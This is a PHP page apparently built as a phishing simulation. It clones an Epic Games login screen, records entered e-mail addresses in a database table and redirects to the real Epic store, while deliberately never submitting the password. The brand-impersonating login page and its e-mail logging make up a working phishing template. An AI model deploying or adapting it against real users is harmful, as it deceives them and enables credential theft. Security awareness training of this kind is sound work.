<?php
require_once 'banco.php';

$mensagem = "";
$tipo = "";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = trim($_POST["email"] ?? "");

    if (empty($email)) {
        $mensagem = "Digite um e-mail de teste.";
        $tipo = "erro";
    } else {
        try {
            
            $stmt = $pdo->prepare("INSERT INTO tentativas (usuario_teste) VALUES (:usuario)");
            $stmt->bindParam(':usuario', $email);
            $stmt->execute();

            
            header("Location: https://store.epicgames.com/");
            exit;

        } catch (PDOException $e) {
            $mensagem = "Erro ao registrar no banco de dados: " . $e->getMessage();
            $tipo = "erro";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EPIC - Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            min-height: 100vh;
            background: #101010;
            font-family: Arial, Helvetica, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #ffffff;
        }

        .login-container {
            width: 339px;
            min-height: 403px;
            background: #222222;
            padding: 35px 43px 30px;
            text-align: center;
        }

        .logo {
            width: 31px;
            height: 35px;
            margin: 0 auto 27px;
            background: #ffffff;
            color: #111111;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 8px;
            font-weight: bold;
            line-height: 8px;
            border-radius: 2px;
        }

        .title {
            font-size: 9px;
            font-weight: bold;
            margin-bottom: 13px;
            color: #eeeeee;
        }

        .input-container {
            position: relative;
            margin-bottom: 10px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            height: 36px;
            border: none;
            outline: none;
            background: #303030;
            color: #eeeeee;
            padding: 0 11px;
            font-size: 10px;
        }

        input::placeholder {
            color: #858585;
        }

        input:focus {
            background: #363636;
            outline: 1px solid #555555;
        }

        .password-container {
            position: relative;
        }

        .password-container input {
            padding-right: 35px;
        }

        .eye {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #8c8c8c;
            font-size: 13px;
            cursor: pointer;
            user-select: none;
        }

        .options {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            margin-top: 2px;
            margin-bottom: 11px;
            font-size: 9px;
        }

        .esqueci {
            color: #a7a7a7;
            text-decoration: none;
            cursor: pointer;
        }

        .esqueci:hover {
            color: #ffffff;
            text-decoration: underline;
        }

        .login-button {
            width: 100%;
            height: 36px;
            border: none;
            background: #0078f2;
            color: #ffffff;
            font-size: 9px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 26px;
        }

        .login-button:hover {
            background: #0060c0;
        }

        .register {
            color: #888888;
            font-size: 9px;
            line-height: 15px;
        }

        .register a {
            color: #eeeeee;
            text-decoration: none;
        }

        .register a:hover {
            text-decoration: underline;
        }

        .message {
            margin-top: 15px;
            padding: 10px;
            font-size: 9px;
            line-height: 13px;
        }

        .message.erro {
            background: #3b2020;
            color: #ffaaaa;
        }
    </style>
</head>
<body>

    <div class="login-container">

        <div class="logo">
            <span>EPIC</span>
        </div>

        <div class="title">
            FAZER LOGIN COM UMA CONTA DA EPIC 
        </div>

        <form method="POST" onsubmit="return verificarSimulacao();">

            <div class="input-container">
                <input
                    type="email"
                    name="email"
                    placeholder="Endereço de E-mail"
                    autocomplete="off"
                    required
                >
            </div>

            <div class="input-container password-container">
                <input
                    type="password"
                    id="senha"
                    placeholder="Senha"
                    autocomplete="off"
                    required
                >
                <span
                    class="eye"
                    onclick="mostrarSenha()"
                    title="Mostrar senha"
                >
                    ◉
                </span>
            </div>

            <div class="options">
                <a href="#" class="esqueci" onclick="esqueciSenha(event)">
                    Esqueceu Sua Senha
                </a>
            </div>

            <button type="submit" class="login-button">
                ENTRE NA SUA CONTA AGORA
            </button>

        </form>

        <div class="register">
            Não tem uma conta da Epic? Cadastrar
            <br>
            Voltar para todas as opções de inscrição
        </div>

        <?php if (!empty($mensagem)): ?>
            <div class="message <?= htmlspecialchars($tipo) ?>">
                <?= htmlspecialchars($mensagem) ?>
            </div>
        <?php endif; ?>

    </div>

    <script>
        function mostrarSenha() {
            const senha = document.getElementById("senha");
            senha.type = (senha.type === "password") ? "text" : "password";
        }

        function esqueciSenha(event) {
            event.preventDefault();
            alert("esqueceu né.");
        }

        function verificarSimulacao() {
            const senha = document.getElementById("senha");
            senha.removeAttribute("name");
            return true;
        }
    </script>

</body>
</html>
